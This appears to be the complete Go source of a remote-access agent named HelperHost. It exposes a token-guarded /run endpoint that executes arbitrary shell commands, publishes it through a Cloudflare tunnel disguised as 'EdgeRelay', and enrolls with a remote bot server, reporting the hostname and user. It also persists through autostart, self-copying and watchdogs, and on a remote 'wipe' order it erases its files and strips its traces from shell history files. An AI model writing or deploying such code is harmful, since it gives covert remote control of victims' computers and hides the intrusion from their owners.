// HelperHost — zero system deps. Single static binary (no Python).
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	helperName = "HelperHost"
	edgeName   = "EdgeRelay"
)

var (
	dir        string
	cacheDir   string
	configPath string
	tokenPath  string
	urlPath    string
	logPath    string
	edgePath   string
	helperPath string
	enrollKey  string
	botBase    string
	token      string
	publicURL  string
	stopFlag   bool
	cfProc     *exec.Cmd
	cfMu       sync.Mutex
)

func initPaths() {
	home, _ := os.UserHomeDir()
	switch runtime.GOOS {
	case "windows":
		base := os.Getenv("LOCALAPPDATA")
		if base == "" {
			base = filepath.Join(home, "AppData", "Local")
		}
		dir = filepath.Join(base, "HelperHost")
	case "darwin":
		dir = filepath.Join(home, "Library", "Application Support", "HelperHost")
	default:
		dir = filepath.Join(home, ".local", "share", "HelperHost")
	}
	cacheDir = filepath.Join(os.TempDir(), "HelperHostCache")
	_ = os.MkdirAll(dir, 0o755)
	_ = os.MkdirAll(cacheDir, 0o755)
	configPath = filepath.Join(dir, "config.json")
	tokenPath = filepath.Join(dir, "token")
	urlPath = filepath.Join(dir, "public_url")
	logPath = filepath.Join(dir, "agent.log")
	if runtime.GOOS == "windows" {
		edgePath = filepath.Join(dir, edgeName+".exe")
		helperPath = filepath.Join(dir, helperName+".exe")
	} else {
		edgePath = filepath.Join(dir, edgeName)
		helperPath = filepath.Join(dir, helperName)
	}
}

func logf(msg string) {
	reURL := regexp.MustCompile(`https://[^\s]+`)
	reIP := regexp.MustCompile(`\b\d{1,3}(?:\.\d{1,3}){3}\b`)
	safe := reURL.ReplaceAllString(msg, "[redacted]")
	safe = reIP.ReplaceAllString(safe, "[redacted]")
	line := time.Now().UTC().Format("2006-01-02T15:04:05Z ") + safe + "\n"
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	defer f.Close()
	_, _ = f.WriteString(line)
}

func hostname() string {
	h, err := os.Hostname()
	if err != nil || h == "" {
		return "host"
	}
	if i := strings.IndexByte(h, '.'); i > 0 {
		h = h[:i]
	}
	return h
}

func loadConfig() error {
	enrollKey = strings.TrimSpace(os.Getenv("AGENTSHE_ENROLL"))
	botBase = strings.TrimRight(strings.TrimSpace(os.Getenv("AGENTSHE_BOT_BASE")), "/")
	if b, err := os.ReadFile(configPath); err == nil {
		var cfg map[string]string
		if json.Unmarshal(b, &cfg) == nil {
			if enrollKey == "" {
				enrollKey = strings.TrimSpace(cfg["enroll"])
			}
			if botBase == "" {
				botBase = strings.TrimRight(strings.TrimSpace(cfg["bot_base"]), "/")
			}
		}
	}
	if enrollKey == "" || botBase == "" {
		return fmt.Errorf("config manquante")
	}
	raw, _ := json.Marshal(map[string]string{"enroll": enrollKey, "bot_base": botBase})
	return os.WriteFile(configPath, raw, 0o600)
}

func findFreePort() (int, error) {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return 0, err
	}
	defer l.Close()
	return l.Addr().(*net.TCPAddr).Port, nil
}

func runCmd(command string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		cmd = exec.CommandContext(ctx, "bash", "-lc", command)
	}
	out, err := cmd.CombinedOutput()
	if ctx.Err() == context.DeadlineExceeded {
		return "(timeout)", 124
	}
	code := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			code = ee.ExitCode()
		} else {
			return string(out) + err.Error(), 1
		}
	}
	return string(out), code
}

func download(url, dest string) error {
	tmp := dest + ".part"
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Errorf("download %s: %s", url, resp.Status)
	}
	f, err := os.Create(tmp)
	if err != nil {
		return err
	}
	_, err = io.Copy(f, resp.Body)
	_ = f.Close()
	if err != nil {
		_ = os.Remove(tmp)
		return err
	}
	return os.Rename(tmp, dest)
}

func cacheCopy(name, dest string) bool {
	src := filepath.Join(cacheDir, name)
	b, err := os.ReadFile(src)
	if err != nil {
		return false
	}
	if err := os.WriteFile(dest, b, 0o755); err != nil {
		return false
	}
	_ = os.Chmod(dest, 0o755)
	return true
}

func toCache(name, src string) {
	b, err := os.ReadFile(src)
	if err != nil {
		return
	}
	_ = os.WriteFile(filepath.Join(cacheDir, name), b, 0o755)
}

func edgeURL() string {
	arch := runtime.GOARCH
	switch runtime.GOOS {
	case "windows":
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
	case "darwin":
		if arch == "arm64" {
			return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
		}
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
	default:
		if arch == "arm64" {
			return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
		}
		return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
	}
}

func edgeFileName() string {
	if runtime.GOOS == "windows" {
		return edgeName + ".exe"
	}
	return edgeName
}

func helperFileName() string {
	if runtime.GOOS == "windows" {
		return helperName + ".exe"
	}
	return helperName
}

func ensureEdgeRelay() (string, error) {
	name := edgeFileName()
	if st, err := os.Stat(edgePath); err == nil && !st.IsDir() {
		toCache(name, edgePath)
		return edgePath, nil
	}
	if cacheCopy(name, edgePath) {
		logf("EdgeRelay restored from cache")
		return edgePath, nil
	}
	staging := filepath.Join(cacheDir, name+".download")
	logf("fetch EdgeRelay via temp")
	if err := download(edgeURL(), staging); err != nil {
		return "", err
	}
	b, err := os.ReadFile(staging)
	if err != nil {
		return "", err
	}
	if err := os.WriteFile(edgePath, b, 0o755); err != nil {
		return "", err
	}
	_ = os.Chmod(edgePath, 0o755)
	toCache(name, edgePath)
	return edgePath, nil
}

func ensureHelperPresent() {
	name := helperFileName()
	self, err := os.Executable()
	if err == nil {
		if abs, e2 := filepath.Abs(self); e2 == nil {
			self = abs
		}
		// keep a copy of ourselves in DIR + cache for watchdog restarts
		if st, err := os.Stat(helperPath); err != nil || st.Size() == 0 {
			if b, err := os.ReadFile(self); err == nil {
				_ = os.WriteFile(helperPath, b, 0o755)
				_ = os.Chmod(helperPath, 0o755)
			}
		}
		toCache(name, self)
		return
	}
	if cacheCopy(name, helperPath) {
		logf("HelperHost restored from cache")
	}
}

func authOK(r *http.Request, body map[string]any) bool {
	t := strings.TrimSpace(r.Header.Get("X-AgentShe-Token"))
	if t == "" {
		if v, ok := body["token"].(string); ok {
			t = strings.TrimSpace(v)
		}
	}
	if t == "" {
		t = strings.TrimSpace(r.URL.Query().Get("token"))
	}
	return t != "" && t == token
}

func readJSON(r *http.Request) map[string]any {
	defer r.Body.Close()
	var body map[string]any
	_ = json.NewDecoder(r.Body).Decode(&body)
	if body == nil {
		body = map[string]any{}
	}
	return body
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

func handle(w http.ResponseWriter, r *http.Request) {
	path := r.URL.Path
	switch {
	case path == "/health" && r.Method == http.MethodGet:
		body := map[string]any{}
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		writeJSON(w, 200, map[string]any{"ok": true})
	case path == "/run" && r.Method == http.MethodPost:
		body := readJSON(r)
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		cmd, _ := body["command"].(string)
		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			writeJSON(w, 400, map[string]any{"ok": false})
			return
		}
		out, ec := runCmd(cmd)
		writeJSON(w, 200, map[string]any{"ok": true, "output": out, "exit_code": ec})
	case path == "/shutdown" && r.Method == http.MethodPost:
		body := readJSON(r)
		if !authOK(r, body) {
			writeJSON(w, 401, map[string]any{"ok": false})
			return
		}
		writeJSON(w, 200, map[string]any{"ok": true, "bye": true})
		go func() {
			time.Sleep(200 * time.Millisecond)
			wipeAll()
		}()
	default:
		writeJSON(w, 404, map[string]any{"ok": false})
	}
}

func killTunnelOnly() {
	cfMu.Lock()
	defer cfMu.Unlock()
	if cfProc != nil && cfProc.Process != nil {
		_ = cfProc.Process.Kill()
		_, _ = cfProc.Process.Wait()
		cfProc = nil
	}
	if runtime.GOOS == "windows" {
		_ = exec.Command("taskkill", "/F", "/IM", "EdgeRelay.exe").Run()
	} else {
		_ = exec.Command("pkill", "-f", edgeName).Run()
	}
}

func secureRmTree(path string) {
	if path == "" {
		return
	}
	_ = filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil || info == nil || info.IsDir() {
			return nil
		}
		name := info.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".json") || strings.HasSuffix(name, ".txt") ||
			name == "token" || name == "public_url" || name == "boot.log" {
			_ = os.WriteFile(p, bytes.Repeat([]byte{0}, int(min64(info.Size(), 2_000_000))), 0o600)
		}
		return nil
	})
	_ = os.RemoveAll(path)
}

func min64(a, b int64) int64 {
	if a < b {
		return a
	}
	return b
}

func scrubShellArtifacts() {
	markers := []string{
		"HelperHost", "EdgeRelay", "agentshe", "AgentSHE", "lilygopro",
		"bootstrap-sh", "bootstrap&enroll", "HelperHostCache",
		"install.sh", "install.ps1",
	}
	home, _ := os.UserHomeDir()
	var candidates []string
	if runtime.GOOS == "windows" {
		candidates = append(candidates, filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"))
	} else {
		candidates = append(candidates,
			filepath.Join(home, ".bash_history"),
			filepath.Join(home, ".zsh_history"),
			filepath.Join(home, ".local", "share", "fish", "fish_history"),
		)
	}
	for _, path := range candidates {
		b, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		lines := strings.Split(string(b), "\n")
		var kept []string
		for _, ln := range lines {
			low := strings.ToLower(ln)
			drop := false
			for _, m := range markers {
				if strings.Contains(low, strings.ToLower(m)) {
					drop = true
					break
				}
			}
			if !drop {
				kept = append(kept, ln)
			}
		}
		if len(kept) != len(lines) {
			_ = os.WriteFile(path, []byte(strings.Join(kept, "\n")), 0o600)
		}
	}
}

func killRelatedProcs() {
	// Stop watchdog / reconnect so they cannot restore HelperHost from cache mid-wipe.
	if runtime.GOOS == "windows" {
		ps := `
$ErrorActionPreference='SilentlyContinue'
Get-CimInstance Win32_Process | Where-Object {
  $_.CommandLine -and (
    $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\.vbs|reconnect\.vbs|AgentShe'
  ) -and $_.Name -match '^(wscript|cscript|EdgeRelay)\.exe$'
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
taskkill /F /IM EdgeRelay.exe 2>$null
`
		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).Run()
		return
	}
	for _, pat := range []string{
		filepath.Join(dir, "watchdog.sh"),
		filepath.Join(dir, "reconnect.sh"),
		"HelperHostCache",
		edgeName,
	} {
		_ = exec.Command("pkill", "-f", pat).Run()
	}
}

func wipeAll() {
	stopFlag = true
	removeAutostart()
	killRelatedProcs()
	killTunnelOnly()
	scrubShellArtifacts()
	// Cache first — prevents watchdog restore race if anything still runs.
	secureRmTree(cacheDir)
	secureRmTree(dir)
	home, _ := os.UserHomeDir()
	secureRmTree(filepath.Join(home, ".agentshe"))
	if runtime.GOOS == "windows" {
		if local := os.Getenv("LOCALAPPDATA"); local != "" {
			secureRmTree(filepath.Join(local, "AgentShe"))
			secureRmTree(filepath.Join(local, "CabaretAgent"))
		}
		if tmp := os.Getenv("TEMP"); tmp != "" {
			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
		}
		// Running .exe may stay locked until exit — finish wipe after process dies.
		delayed := fmt.Sprintf(
			`ping 127.0.0.1 -n 4 >nul & rmdir /s /q "%s" & rmdir /s /q "%s"`,
			dir, cacheDir,
		)
		cmd := exec.Command("cmd", "/C", delayed)
		hideWindow(cmd)
		_ = cmd.Start()
	} else {
		secureRmTree("/tmp/HelperHostCache")
		if t := os.Getenv("TMPDIR"); t != "" {
			secureRmTree(filepath.Join(t, "HelperHostCache"))
		}
	}
	os.Exit(0)
}

func networkOK() bool {
	client := &http.Client{Timeout: 3 * time.Second}
	for _, u := range []string{"https://1.1.1.1", "https://cloudflare.com"} {
		resp, err := client.Get(u)
		if err == nil {
			resp.Body.Close()
			return true
		}
	}
	return false
}

func startTunnel(port int) (string, error) {
	killTunnelOnly()
	bin, err := ensureEdgeRelay()
	if err != nil {
		return "", err
	}
	cmd := exec.Command(bin, "tunnel", "--url", fmt.Sprintf("http://127.0.0.1:%d", port), "--no-autoupdate")
	hideWindow(cmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "", err
	}
	cmd.Stderr = cmd.Stdout
	if err := cmd.Start(); err != nil {
		return "", err
	}
	cfMu.Lock()
	cfProc = cmd
	cfMu.Unlock()

	re := regexp.MustCompile(`https://[a-zA-Z0-9.-]+\.trycloudflare\.com`)
	ch := make(chan string, 1)
	go func() {
		buf := make([]byte, 4096)
		var acc string
		for {
			n, err := stdout.Read(buf)
			if n > 0 {
				acc += string(buf[:n])
				if m := re.FindString(acc); m != "" {
					ch <- strings.TrimRight(m, "/")
					return
				}
				if len(acc) > 200_000 {
					acc = acc[len(acc)-50_000:]
				}
			}
			if err != nil {
				ch <- ""
				return
			}
		}
	}()

	select {
	case u := <-ch:
		if u == "" {
			return "", fmt.Errorf("tunnel non prêt")
		}
		return u, nil
	case <-time.After(90 * time.Second):
		return "", fmt.Errorf("tunnel non prêt")
	}
}

func httpPostJSON(url string, payload any) (map[string]any, error) {
	raw, _ := json.Marshal(payload)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(raw))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{Timeout: 45 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var data map[string]any
	if err := json.Unmarshal(b, &data); err != nil {
		return nil, err
	}
	return data, nil
}

func platformName() string {
	if runtime.GOOS == "windows" {
		return "windows"
	}
	if runtime.GOOS == "darwin" {
		return "mac"
	}
	return "linux"
}

func reportWiped(tok string) error {
	data, err := httpPostJSON(botBase+"/agent?action=wiped", map[string]string{"token": tok})
	if err != nil {
		return err
	}
	if ok, _ := data["ok"].(bool); !ok {
		return fmt.Errorf("wiped ack failed")
	}
	return nil
}

func wipeOrdered() bool {
	if token == "" || botBase == "" {
		return false
	}
	data, err := httpPostJSON(botBase+"/agent?action=wipe-check", map[string]string{"token": token})
	if err != nil {
		return false
	}
	ok, _ := data["ok"].(bool)
	wipe, _ := data["wipe"].(bool)
	return ok && wipe
}

func enroll(public string) (string, error) {
	var last error
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	for attempt := 1; attempt <= 30; attempt++ {
		data, err := httpPostJSON(botBase+"/agent?action=enroll&enroll="+enrollKey, map[string]string{
			"hostname":     hostname(),
			"callback_url": public,
			"user":         user,
			"os":           runtime.GOOS,
			"platform":     platformName(),
		})
		if err != nil {
			last = err
			logf(fmt.Sprintf("enroll retry %d", attempt))
			time.Sleep(time.Duration(min(2*attempt, 20)) * time.Second)
			continue
		}
		if ok, _ := data["ok"].(bool); !ok {
			last = fmt.Errorf("%v", data["error"])
			logf(fmt.Sprintf("enroll retry %d", attempt))
			time.Sleep(time.Duration(min(2*attempt, 20)) * time.Second)
			continue
		}
		tok, _ := data["token"].(string)
		if wipe, _ := data["wipe"].(bool); wipe {
			logf("wipe ordered on enroll")
			for i := 0; i < 5; i++ {
				if reportWiped(tok) == nil {
					break
				}
				time.Sleep(2 * time.Second)
			}
			wipeAll()
		}
		return tok, nil
	}
	return "", last
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func tunnelPublicOK() bool {
	if publicURL == "" || token == "" {
		return false
	}
	client := &http.Client{Timeout: 12 * time.Second}
	resp, err := client.Get(publicURL + "/health?token=" + token)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	var data map[string]any
	_ = json.NewDecoder(resp.Body).Decode(&data)
	ok, _ := data["ok"].(bool)
	return ok
}

func acquireLock() {
	lock := filepath.Join(dir, "agent.lock")
	if b, err := os.ReadFile(lock); err == nil {
		var pid int
		fmt.Sscanf(strings.TrimSpace(string(b)), "%d", &pid)
		if pid > 0 {
			if processExists(pid) {
				os.Exit(0)
			}
		}
		_ = os.Remove(lock)
	}
	_ = os.WriteFile(lock, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
}

func processExists(pid int) bool {
	p, err := os.FindProcess(pid)
	if err != nil {
		return false
	}
	if runtime.GOOS == "windows" {
		return true
	}
	return p.Signal(syscall.Signal(0)) == nil
}

func publish(port int, first bool, autostartInfo string) error {
	ensureHelperPresent()
	if _, err := ensureEdgeRelay(); err != nil {
		return err
	}
	for i := 0; i < 60; i++ {
		if networkOK() {
			break
		}
		time.Sleep(2 * time.Second)
	}
	u, err := startTunnel(port)
	if err != nil {
		return err
	}
	publicURL = u
	tok, err := enroll(publicURL)
	if err != nil {
		return err
	}
	token = tok
	_ = os.WriteFile(tokenPath, []byte(token), 0o600)
	_ = os.WriteFile(urlPath, []byte(publicURL), 0o600)
	logf("ready")
	if first {
		fmt.Println("OK")
		fmt.Printf("agent=%s\n", hostname())
		fmt.Printf("autostart=%s\n", autostartInfo)
		fmt.Println("reboot=auto")
		fmt.Println("watchdog=on")
		fmt.Printf("proc_agent=%s\n", helperFileName())
		fmt.Printf("proc_tunnel=%s\n", edgeFileName())
		fmt.Printf("deps=none\n")
	}
	return nil
}

func superviseUntilBreak() {
	ticks := 0
	fail := 0
	for !stopFlag {
		time.Sleep(5 * time.Second)
		ticks++
		ensureHelperPresent()
		_, _ = ensureEdgeRelay()
		if ticks%3 == 0 && wipeOrdered() {
			logf("wipe ordered while running")
			for i := 0; i < 5; i++ {
				if reportWiped(token) == nil {
					break
				}
				time.Sleep(2 * time.Second)
			}
			wipeAll()
		}
		cfMu.Lock()
		alive := cfProc != nil && cfProc.Process != nil
		cfMu.Unlock()
		if !alive {
			return
		}
		if !networkOK() {
			fail++
			if fail >= 2 {
				return
			}
			continue
		}
		fail = 0
		if ticks%6 == 0 && !tunnelPublicOK() {
			return
		}
	}
}

func main() {
	initPaths()
	if err := loadConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
	acquireLock()
	ensureHelperPresent()
	info := installAutostart()
	port, err := findFreePort()
	if err != nil {
		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
		os.Exit(1)
	}
	mux := http.NewServeMux()
	mux.HandleFunc("/", handle)
	srv := &http.Server{Addr: fmt.Sprintf("127.0.0.1:%d", port), Handler: mux}
	go func() { _ = srv.ListenAndServe() }()

	first := true
	for !stopFlag {
		if err := publish(port, first, info); err != nil {
			logf("err " + err.Error())
			time.Sleep(5 * time.Second)
			continue
		}
		first = false
		superviseUntilBreak()
		killTunnelOnly()
		time.Sleep(2 * time.Second)
	}
	_ = srv.Shutdown(context.Background())
}
